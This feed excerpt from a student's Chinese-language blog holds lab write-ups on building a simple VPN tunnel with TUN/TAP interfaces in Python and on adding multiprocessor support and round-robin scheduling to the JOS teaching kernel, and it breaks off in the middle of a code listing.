class="hljs-number">0</span>, code = <span class="hljs-number">0</span>)os.write(tun, bytes(newpkt))print(ip.summary())</code></pre><p>之后再次选择<code>ping 192.168.53.1</code>，同时用wireshark抓包，抓包情况如下，tun收到了相应的回显包的请求</p><p><img src="/2020/12/13/VPN-Tunneling/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><p>向接口中写入任意的数据，而不是IP包的时候</p><p><img src="/2020/12/13/VPN-Tunneling/2-8.PNG" srcset="/img/loading.gif" alt="2-8"></p><p>同样运行ping 192.168.53.1，之后wireshark抓包情况如下，可以看出来tun会把写入的东西当作IP数据包来处理</p><p><img src="/2020/12/13/VPN-Tunneling/2-7.PNG" srcset="/img/loading.gif" alt="2-7"></p><h3 id="Task-3：通过隧道将IP包发往VPN-server"><a href="#Task-3：通过隧道将IP包发往VPN-server" class="headerlink" title="Task 3：通过隧道将IP包发往VPN server"></a>Task 3：通过隧道将IP包发往VPN server</h3><p><img src="/2020/12/13/VPN-Tunneling/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>当我们ping 192.168.53.1的时候，内部会有一个IP数据包发往对应的IP地址，之后外层的UDP包是由10.0.2.4发往10.0.2.5的，wireshark抓包如下</p><p><img src="/2020/12/13/VPN-Tunneling/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>当我们选择ping 192.168.60.10的时候，VPN Server端什么都不会打印出来，通过wireshark抓包可以发现，我认为这是由于目的IP和TUN接口不在一个子网当中，并且没有对应的路由表项，所以会将发给192.168.60.0/24的数据包交给10.0.2.4来发送，而此时tun_client.py相当于是不发挥作用</p><p><img src="/2020/12/13/VPN-Tunneling/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><p>为了解决这个问题，我们需要设置路由，将发给192.168.60.0/24的数据包交给TUN接口来发送</p><p><img src="/2020/12/13/VPN-Tunneling/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><p>之后再次ping 192.168.60.0/24，VPN_Server端会收到相应的数据包，并且wireshark会显示发包过程</p><p><img src="/2020/12/13/VPN-Tunneling/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p><img src="/2020/12/13/VPN-Tunneling/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><h3 id="Task-3回顾"><a href="#Task-3回顾" class="headerlink" title="Task 3回顾"></a>Task 3回顾</h3><p>对于整个过程要有所理解，首先我们前面之所以ping 192.168.53.0/24能够成功，是因为Host U知道发往这个子网的IP数据包应该交给192.168.53.99（TUN接口）来处理，而之后当我们ping 192.168.60.0/24的时候，并不知道是路由表项，会交给10.0.2.4来处理，这就有了上面我们用wireshark抓包会显示从10.0.2.4这个接口发出的原因，因为这时候TUN接口压根不起作用，而之后，当我们知道要将发给192.168.60.0/24的IP数据包交给TUN接口的时候，我们就可以开始执行后面的code</p><p><img src="/2020/12/13/VPN-Tunneling/3-7.PNG" srcset="/img/loading.gif" alt="3-7"></p><h3 id="Task-4：设置VPN服务器"><a href="#Task-4：设置VPN服务器" class="headerlink" title="Task 4：设置VPN服务器"></a>Task 4：设置VPN服务器</h3><blockquote><p>在tun_server.py收到一个来自于隧道当中的包的时候，需要提交给内核，之后内核将其路由到最终目的地。这需要TUN接口来完成</p></blockquote><p>我认为之所以需要TUN接口来运行，其实是相当于是解包的过程，因为在Host U的那一端，我们首先是将数据写入到tun文件当中，这时候相当于是有了一个IP包（里），但是之后这个包会在10.0.2.4那里被放到UDP的有效载荷那里，之后外面再包上UDP头部以及IP头部。现在在VPN server端，其实只能是读取到pkt的信息，也就是里面的IP包那一层，还需要TUN接口来进一步解包</p><p>首先，在VPN_Server上面可以根据terminal打印的东西看到，ping 192.168.60.101的数据包是到达了VPN_Server的</p><p><img src="/2020/12/13/VPN-Tunneling/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>之后，我们进行抓包，可以看到在wireshak中，192.168.53.99是向192.168.60.101发送了ICMP request包并且目的主机返回了ICMP的response包的</p><p><img src="/2020/12/13/VPN-Tunneling/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><p>但是此时根据在VPN_Client运行的TUN接口的termina可以得知，是没有收到相应的数据包的。分析可以得知ICMP request包的确到达，此时单方面ping通</p><h3 id="Task-5：处理两个方向上的流量"><a href="#Task-5：处理两个方向上的流量" class="headerlink" title="Task 5：处理两个方向上的流量"></a>Task 5：处理两个方向上的流量</h3><ul><li><p>在VPN server上面，当监听的是socket的时候，那说明是收到了来自于其他地方的包，所以需要将包递交给TUN接口来进一步解包，而当时tun接口的时候，需要把包读出来，通过socket发给Host V</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-keyword">import</span> fcntl<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> time<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *IP_A = <span class="hljs-string">"0.0.0.0"</span>PORT = <span class="hljs-number">9090</span>TUNSETIFF = <span class="hljs-number">0x400454ca</span>IFF_TUN = <span class="hljs-number">0x0001</span>IFF_TAP = <span class="hljs-number">0x0002</span>IFF_NO_PI = <span class="hljs-number">0x1000</span><span class="hljs-keyword">global</span> portsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.bind((IP_A, PORT))<span class="hljs-comment"># Create the tun interface</span>tun = os.open(<span class="hljs-string">"/dev/net/tun"</span>, os.O_RDWR)ifr = struct.pack(<span class="hljs-string">'16sH'</span>, <span class="hljs-string">b'long%d'</span>, IFF_TUN | IFF_NO_PI)ifname_bytes = fcntl.ioctl(tun, TUNSETIFF, ifr)<span class="hljs-comment"># Get the interface name</span>ifname = ifname_bytes.decode(<span class="hljs-string">'UTF-8'</span>)[:<span class="hljs-number">16</span>].strip(<span class="hljs-string">"\x00"</span>)print(<span class="hljs-string">"Interface Name: &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip addr add 192.168.53.100/24 dev &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip link set dev &#123;&#125; up"</span>.format(ifname))<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># this will block until at least one interface is ready</span>ready, _, _ = select.select([sock, tun], [], [])<span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> ready:<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> sock:data, (ip, port) = sock.recvfrom(<span class="hljs-number">2048</span>)pkt = IP(data)print(<span class="hljs-string">"From socket &lt;==: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))<span class="hljs-comment">#we need to send the IP packet to the TUN interface</span>os.write(tun, bytes(pkt))<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> tun:<span class="hljs-comment"># read from the file</span>packet = os.read(tun, <span class="hljs-number">2048</span>)pkt = IP(packet)print(<span class="hljs-string">"From tun ==&gt;: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))sock.sendto(packet, (<span class="hljs-string">"10.0.2.4"</span>, port))</code></pre></li><li><p>在VPN_Client上面，当监听到socket的时候，说明是来自外面的包，需要发给TUN接口，而当是TUN接口的时候，需要利用socket发给VPN_Server</p>  <pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><span class="hljs-keyword">import</span> fcntl<span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> select<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *TUNSETIFF = <span class="hljs-number">0x400454ca</span>IFF_TUN = <span class="hljs-number">0x0001</span>IFF_TAP = <span class="hljs-number">0x0002</span>IFF_NO_PI = <span class="hljs-number">0x1000</span>PORT = <span class="hljs-number">9090</span><span class="hljs-comment"># Create the tun interface</span>tun = os.open(<span class="hljs-string">"/dev/net/tun"</span>, os.O_RDWR)ifr = struct.pack(<span class="hljs-string">'16sH'</span>, <span class="hljs-string">b'jia%d'</span>, IFF_TUN | IFF_NO_PI)ifname_bytes = fcntl.ioctl(tun, TUNSETIFF, ifr)<span class="hljs-comment"># Get the interface name</span>ifname = ifname_bytes.decode(<span class="hljs-string">'UTF-8'</span>)[:<span class="hljs-number">16</span>].strip(<span class="hljs-string">"\x00"</span>)print(<span class="hljs-string">"Interface Name: &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip addr add 192.168.53.99/24 dev &#123;&#125;"</span>.format(ifname))os.system(<span class="hljs-string">"ip link set dev &#123;&#125; up"</span>.format(ifname))sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-comment"># this will block until at least one interface is ready</span>ready, _, _ = select.select([sock, tun], [], [])<span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> ready:<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> sock:data, (ip, port) = sock.recvfrom(<span class="hljs-number">2048</span>)pkt = IP(data)print(<span class="hljs-string">"From socket &lt;==: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))<span class="hljs-comment">#we need to send the IP packet to the TUN interface</span>os.write(tun, bytes(pkt))<span class="hljs-keyword">if</span> fd <span class="hljs-keyword">is</span> tun:<span class="hljs-comment"># read from the file</span>packet = os.read(tun, <span class="hljs-number">2048</span>)pkt = IP(packet)print(<span class="hljs-string">"From tun ==&gt;: &#123;&#125; --&gt; &#123;&#125;"</span>.format(pkt.src, pkt.dst))sock.sendto(packet, (<span class="hljs-string">"10.0.2.5"</span>, <span class="hljs-number">9090</span>))</code></pre></li></ul><p>当我们选择ping的时候，可以看到ping成功</p><p><img src="/2020/12/13/VPN-Tunneling/5-2.PNG" srcset="/img/loading.gif" alt="5-2"></p><p>对于包流动的分析</p><p><img src="/2020/12/13/VPN-Tunneling/5-3.PNG" srcset="/img/loading.gif" alt="5-3"></p><p>数据包流动情况：执行命令时，通过 TUN 发包，client 程序检测到 TUN 接收到包后，读取并通过 socket 发给 VPN server；这时 server 程序又检测到 socket 收到包，取 出内层 IP 包并写到 TUN，VPN server 通过内部网发给主机 V；主机 V 收到 echo-request 包后回 复 echo-reply 包；该包到达 VPN server 后，server 程序又检测到 TUN 收到包，读取并通过 socket 发给主机 U；client 程序又检测到 socket 收到包，读取并写到 TUN 接口，完成通信。</p><p>之后再host U上面telnet host V，数据包流动情况和上面基本一样</p><p><img src="/2020/12/13/VPN-Tunneling/5-5.PNG" srcset="/img/loading.gif" alt="5-5"></p><p><img src="/2020/12/13/VPN-Tunneling/5-4.PNG" srcset="/img/loading.gif" alt="5-4"></p><h3 id="Task-6：隧道破除实验"><a href="#Task-6：隧道破除实验" class="headerlink" title="Task 6：隧道破除实验"></a>Task 6：隧道破除实验</h3><p>关闭tun_client.py,并不能看到输入的内容，此时TCP链接发送RST、ACK包，连接被断开</p><p><img src="/2020/12/13/VPN-Tunneling/6-1.PNG" srcset="/img/loading.gif" alt="6-1"></p><p>当我们重新运行时，之前在断开连接后输入的命令会显示出来，并且在运行py文件的terminal上面会有包发送和收到的打印</p><p><img src="/2020/12/13/VPN-Tunneling/6-2.PNG" srcset="/img/loading.gif" alt="6-2"></p><p>原因我认为是我们在破坏了VPN隧道之后，数据包不能到达，但是由于是TCP连接，会持续发包一段时间，这段时间内重新建立VPN隧道连接，那么TCP连接就可以重新得以建立，所以之后telnet的命令会显示出来</p><h3 id="Task-7：主机V上面的路由实验"><a href="#Task-7：主机V上面的路由实验" class="headerlink" title="Task 7：主机V上面的路由实验"></a>Task 7：主机V上面的路由实验</h3><ul><li>删除默认条目，添加发往192.168.53.0/24的数据包要通过192.168.60.1这个路由器的条目</li></ul><p><img src="/2020/12/13/VPN-Tunneling/7-1.PNG" srcset="/img/loading.gif" alt="7-1"></p><ul><li>测试，用主机U ping V，成功</li></ul><p><img src="/2020/12/13/VPN-Tunneling/7-2.PNG" srcset="/img/loading.gif" alt="7-2"></p><h3 id="Task-8：试验TUN的IP地址"><a href="#Task-8：试验TUN的IP地址" class="headerlink" title="Task 8：试验TUN的IP地址"></a>Task 8：试验TUN的IP地址</h3><p>更改IP后再次ping 192.168.60.101 ，并且我认为这时候一个是需要设置Host U上面的路由的，即需要选择哪个接口来发包，可以发现<strong>丢包位置是在VPN_Server</strong></p><p><img src="/2020/12/13/VPN-Tunneling/8-1.PNG" srcset="/img/loading.gif" alt="8-1"></p><p><strong>丢包原因：</strong>违反了反向路由机制，VPN_Server的应用层是从TUN接口收到数据包的，这时候进行模拟，模拟reply包从哪里发回去，由于未设置路由并且不是在同一个子网当中，所以会选择默认接口（在这里是10.0.2.5）而不是TUN接口，这就造成了输入和输出接口不一致（输入端口是TUN接口，输出是10.0.2.5的接口），所以会在收到这个包的时候将包丢弃</p><p><strong>解决方法：</strong>在VPN_Server上面设置路由，设置发往192.168.30.0/24子网的包是通过TUN接口的</p><p>再次运行ping 192.168.60.101，ping 成功（记得把task 7修改的路由表改回来或者重新添加）</p><p><img src="/2020/12/13/VPN-Tunneling/8-3.PNG" srcset="/img/loading.gif" alt="8-3"></p><h3 id="Task-9：试验TAP接口"><a href="#Task-9：试验TAP接口" class="headerlink" title="Task 9：试验TAP接口"></a>Task 9：试验TAP接口</h3><p>当我们修改配置对应的TAP接口，命名为jia0，并且设置他的IP地址为192.168.53.99，开始运行<code>ping 192.168.53.0/24</code>（注意设置对应的路由）</p><p>根据相应的代码</p><p><img src="/2020/12/13/VPN-Tunneling/9-2.PNG" srcset="/img/loading.gif" alt="9-2"></p><p><img src="/2020/12/13/VPN-Tunneling/9-1.PNG" srcset="/img/loading.gif" alt="9-1"></p><p>可以看到此时会产生一个ARP包，结合上面代码，会发现这是先构造了一个数据包，之后把这个包发送给TAP接口，而之后会由于打印出summary而显示在运行TUN.py的terminal上面</p><p><strong>判断是否是ARP请求并返回ARP应答实现思路：</strong>在while上面加一个条件判断，当读出的数据包是ARP请求的时候，进行一个write来返回</p><p>实现：</p><p><img src="/2020/12/13/VPN-Tunneling/9-4.PNG" srcset="/img/loading.gif" alt="9-4"></p><p><code>arping -I tap0 192.168.53.33</code>的时候，而在<code>arping -I tap0 1.2.3.4</code>的时候和下面结果一样</p><p><img src="/2020/12/13/VPN-Tunneling/9-3.PNG" srcset="/img/loading.gif" alt="9-3"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;核心内容：了解VPN的两个基本部分（隧道以及加密），涉及到的板块/主题：VPN、TUN/TA</summary>
      
    
    
    
    
    <category term="Network Security" scheme="http://yoursite.com/tags/Network-Security/"/>
    
  </entry>
  
  <entry>
    <title>oslab5_preemptive mutitasking</title>
    <link href="http://yoursite.com/2020/12/07/oslab5-preemptive-mutitasking/"/>
    <id>http://yoursite.com/2020/12/07/oslab5-preemptive-mutitasking/</id>
    <published>2020-12-07T09:17:36.000Z</published>
    <updated>2020-12-14T13:52:16.484Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preemptive-Mutitasking"><a href="#Preemptive-Mutitasking" class="headerlink" title="Preemptive Mutitasking"></a>Preemptive Mutitasking</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在提交的时候，由于换成优先级调度之后make grade不会是满分，所以就把优先级调度所写的算法注释了起来，如果需要检验，可以根据下面优先级调度算法的实现来取消部分注释即可</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>所要做的事情：</p><ul><li>使得JOS支持多CPU处理</li><li>实现进程调用来允许普通进程创建新的进程</li><li>实现协作式进程调度</li></ul><p>在SMP模型当中CPU分为两类：</p><ul><li>启动CPU（BSP）：负责初始化系统，启动操作系统</li><li>应用CPU（AP）：由BSP启动，具体哪一个CPU是BSP根据硬件以及BISO决定的</li></ul><blockquote><p>在 SMP 系统中，每个 CPU 都有一个附属的 LAPIC 单元。LAPIC 单元用于传递中断，并给它所属的 CPU 一个唯一的 ID。</p></blockquote><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p>首先，我们可以看到在lapic_init（）一开始就调用类这个函数，将从<code>lapicaddr</code>开始的4K大小的物理地址映射到了虚拟地址当中，并且返回起始位置，而在mmio_map_region（）当中，实际上是调用<code>boot_map_region（）</code>来建立所需映射</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><pre><code class="hljs c++"><span class="hljs-keyword">void</span> *mmio_map_region(<span class="hljs-keyword">physaddr_t</span> pa, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>)&#123;<span class="hljs-comment">// Where to start the next region.  Initially, this is the</span><span class="hljs-comment">// beginning of the MMIO region.  Because this is static, its</span><span class="hljs-comment">// value will be preserved between calls to mmio_map_region</span><span class="hljs-comment">// (just like nextfree in boot_alloc).</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uintptr_t</span> base = MMIOBASE;<span class="hljs-comment">// Reserve size bytes of virtual memory starting at base and</span><span class="hljs-comment">// map physical pages [pa,pa+size) to virtual addresses</span><span class="hljs-comment">// [base,base+size).  Since this is device memory and not</span><span class="hljs-comment">// regular DRAM, you'll have to tell the CPU that it isn't</span><span class="hljs-comment">// safe to cache access to this memory.  Luckily, the page</span><span class="hljs-comment">// tables provide bits for this purpose; simply create the</span><span class="hljs-comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span><span class="hljs-comment">// write-through) in addition to PTE_W.  (If you're interested</span><span class="hljs-comment">// in more details on this, see section 10.5 of IA32 volume</span><span class="hljs-comment">// 3A.)</span><span class="hljs-comment">//</span><span class="hljs-comment">// Be sure to round size up to a multiple of PGSIZE and to</span><span class="hljs-comment">// handle if this reservation would overflow MMIOLIM (it's</span><span class="hljs-comment">// okay to simply panic if this happens).</span><span class="hljs-comment">//</span><span class="hljs-comment">// Hint: The staff solution uses boot_map_region.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Your code here:</span><span class="hljs-built_in">size</span> = ROUNDUP(<span class="hljs-built_in">size</span>, PGSIZE);<span class="hljs-keyword">if</span>(<span class="hljs-built_in">size</span> + base &gt; MMIOLIM)<span class="hljs-comment">//overflow</span>panic(<span class="hljs-string">"mmio_map_region overflow MMIOLIM"</span>);<span class="hljs-keyword">int</span> perm = PTE_PCD | PTE_PWT | PTE_W;boot_map_region(kern_pgdir, base, <span class="hljs-built_in">size</span>, pa, perm);<span class="hljs-keyword">void</span> *ret = (<span class="hljs-keyword">void</span> *)base;base += <span class="hljs-built_in">size</span>;<span class="hljs-keyword">return</span> ret;&#125;</code></pre><p><strong>应用处理器（AP）引导程序</strong></p><blockquote><p>在启动AP之前，BSP需要搜集多处理器的信息，比如总共有多少CPU，它们的LAPIC ID以及LAPIC MMIO地址。mp_init()函数从BIOS中读取这些信息。具体代码在mp_init()中，该函数会在进入内核后被i386_init()调用，主要作用就是读取mp configuration table中保存的CPU信息，<strong>初始化cpus数组，ncpu（总共多少可用CPU），bootcpu指针（指向BSP对应的CpuInfo结构）</strong>。</p></blockquote><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><blockquote><p>Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><blockquote><p>真正启动AP的是在boot_aps()中，该函数遍历cpus数组，一个接一个启动所有的AP，当一个AP启动后会执行kern/mpentry.S中的代码，然后跳转到mp_main()中，该函数为当前AP设置GDT，TTS，最后设置cpus数组中当前CPU对应的结构的cpu_status为CPU_STARTED。更多关于SMP可以参考</p><p><a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/MPspec.pdf" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.828/2018/readings/ia32/MPspec.pdf</a></p><p><a href="https://wenku.baidu.com/view/615ea3c6aa00b52acfc7ca97.htmlhttps://pdos.csail.mit.edu/6.828/2018/readings/ia32/MPspec.pdf" target="_blank" rel="noopener">https://wenku.baidu.com/view/615ea3c6aa00b52acfc7ca97.html</a></p></blockquote><p>对于此程序运行过程的理解：（这时候是运行在启动CPU上，即BSP，工作在保护模式）</p><ol><li><p>i386_init（）调用了boot_aps（），开始引导其他的CPU运行</p><p> <img src="/2020/12/07/oslab5-preemptive-mutitasking/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p></li><li><p>boot_aps（）调用memmov（），将代码加载到固定位置</p><p> <img src="/2020/12/07/oslab5-preemptive-mutitasking/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p></li><li><p>最后调用labpic_startap来执行对应的CPU</p></li></ol><p>而exercise2实际上就是标记<code>MPENTRY_PADDR</code>开始的一个物理页面为已经使用，加一个if判断即可</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>page_init(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-keyword">size_t</span> i;<span class="hljs-keyword">size_t</span> io_hole_start_page = (<span class="hljs-keyword">size_t</span>)IOPHYSMEM / PGSIZE;<span class="hljs-keyword">size_t</span> kernel_end_page = PADDR(boot_alloc(<span class="hljs-number">0</span>)) / PGSIZE;<span class="hljs-comment">//这里调了半天，boot_alloc返回的是虚拟地址，需要转为物理地址</span><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; npages; i++) &#123;<span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i &gt;= io_hole_start_page &amp;&amp; i &lt; kernel_end_page) &#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == MPENTRY_PADDR / PGSIZE) &#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125; <span class="hljs-keyword">else</span> &#123;pages[i].pp_ref = <span class="hljs-number">0</span>;pages[i].pp_link = page_free_list;page_free_list = &amp;pages[i];&#125;&#125;&#125;</code></pre><p><strong>每个CPU的状态以及初始化</strong></p><p>可以通过CpuInfo结构来看到定义的CPU的信息</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p>而cpunum（）则会返回调用该函数的CPU的ID，而thiscpu的宏定义则是获取当前CPU对应的CpuInfo结构</p><h3 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h3><blockquote><p>Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code></p></blockquote><p>从文档的描述当中我们可以得知，会给每个CPU分配一个内核栈，而BSP（CPU0）的起始位置是KSTACKTOP,每个内核栈的大小回事KSTACKSIZE个字节，而KSTACKGAP字节作为缓冲区检测，防止栈溢出，之后就是CPU1的内核栈，以此类推即可</p><p>根据inc/memlayout.h来写对应的映射即可</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>mem_init_mp(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// Map per-CPU stacks starting at KSTACKTOP, for up to 'NCPU' CPUs.</span><span class="hljs-comment">//</span><span class="hljs-comment">// For CPU i, use the physical memory that 'percpu_kstacks[i]' refers</span><span class="hljs-comment">// to as its kernel stack. CPU i's kernel stack grows down from virtual</span><span class="hljs-comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span><span class="hljs-comment">// divided into two pieces, just like the single stack you set up in</span><span class="hljs-comment">// mem_init:</span><span class="hljs-comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span><span class="hljs-comment">//          -- backed by physical memory</span><span class="hljs-comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span><span class="hljs-comment">//          -- not backed; so if the kernel overflows its stack,</span><span class="hljs-comment">//             it will fault rather than overwrite another CPU's stack.</span><span class="hljs-comment">//             Known as a "guard page".</span><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><span class="hljs-comment">//</span><span class="hljs-comment">// LAB 4: Your code here:</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; NCPU; i++)&#123;boot_map_region(kern_pgdir, KSTACKTOP - KSTKSIZE - i * (KSTKSIZE + KSTKGAP), KSTKSIZE, PADDR(percpu_kstacks[i]), PTE_W);&#125;&#125;</code></pre><h3 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h3><p> 每个CPU都需要单独的TSS和TSS描述符来指定对应的内核栈</p><p>trap_init_percpu（）的作用就是初始化并且加载TSS以及IDT，具体的实现思路就是通过thiscpu来获得当前调用这个函数的CPU的CpuInfo结构，而之后cpuid就更容易了，之后就是thiscpu-&gt;cpu_ts当作当前cpu的TSS，而<code>gdt[(GD_TSS0 &gt;&gt; 3) + i]</code>作为TSS描述符</p><p>具体实现</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>trap_init_percpu(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// LAB 4: Your code here:</span><span class="hljs-comment">// Setup a TSS so that we get the right stack</span><span class="hljs-comment">// when we trap to the kernel.</span>thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - cpuid * (KSTKSIZE + KSTKGAP);thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;thiscpu-&gt;cpu_ts.ts_iomb = <span class="hljs-keyword">sizeof</span>(struct Taskstate);<span class="hljs-comment">// Initialize the TSS slot of the gdt.</span>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="hljs-keyword">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),<span class="hljs-keyword">sizeof</span>(struct Taskstate) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()].sd_s = <span class="hljs-number">0</span>;<span class="hljs-comment">// Load the TSS selector (like other segment selectors, the</span><span class="hljs-comment">// bottom three bits are special; we leave them 0)</span>ltr(GD_TSS0 + (cpunum() &lt;&lt; <span class="hljs-number">3</span>));<span class="hljs-comment">// Load the IDT</span>lidt(&amp;idt_pd);&#125;</code></pre><p><strong>锁</strong></p><blockquote><p>多个CPU在同时执行的之后，需要解决可能产生的竞争问题，在这里采用了big kernel lock的全局锁的方法，每个进程可以持有该锁，当进程从用户态向内核态切换的时候加锁，而当退出内核态的时候解锁，这就保证了只有一个CPU能够执行内核态的代码</p></blockquote><p>对应的lock_kernel（）和unlock_kernal（）定义在spinlock.c当中</p><h3 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h3><p>就直接在对应位置加锁解锁就行了</p><ul><li><p>首先在i386_init（）函数中，BSP在唤醒其他的CPU的时候加锁</p>  <pre><code class="hljs c++"><span class="hljs-comment">// Starting non-boot CPUs</span>lock_kernel();boot_aps();</code></pre></li><li><p>在mp_main（）当中，AP在执行sched_yield（）之前加锁</p>  <pre><code class="hljs c++"><span class="hljs-comment">// Your code here:</span>lock_kernel();sched_yield();</code></pre></li><li><p>在trap（）里面，我们也需要加锁，因为进程从用户态切换到内核态是通过中断来实现的</p>  <pre><code class="hljs c++"><span class="hljs-comment">// LAB 4: Your code here.</span>assert(curenv);lock_kernel();</code></pre></li><li><p>在env_run（）当中，当使用完iret实现从内核态退出的啥时候解锁</p>  <pre><code class="hljs c++">lcr3(PADDR(e-&gt;env_pgdir));unlock_kernel();<span class="hljs-comment">//不放到最后是因为在env_pop_tf()后面的语句不会执行到</span>env_pop_tf(&amp;e-&gt;env_tf);</code></pre></li></ul><p><strong>Round—Robin 调度</strong></p><p>具体是实现过程</p><ul><li>实现sched_yield（），该函数的作用是选择一个进程来运行，而之后从当前进程的Env结构开始搜索envs数组，找到下一个可运行的进程，然后调用env_run（）在当前cpu来运行新的进程</li><li>同时实现一个新的系统调用sys_yield（），来进行进程之间的切换</li></ul><h3 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise 6"></a>Exercise 6</h3><p>sched_yield（）的功能上面已经提到，按上面说的实现即可，同时还要注意，必须考虑到没有找到合适的进程的情况，此时重新执行前面的进程，否则CPU将会停止运行</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>sched_yield(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><span class="hljs-comment">// Implement simple round-robin scheduling.</span><span class="hljs-comment">//</span><span 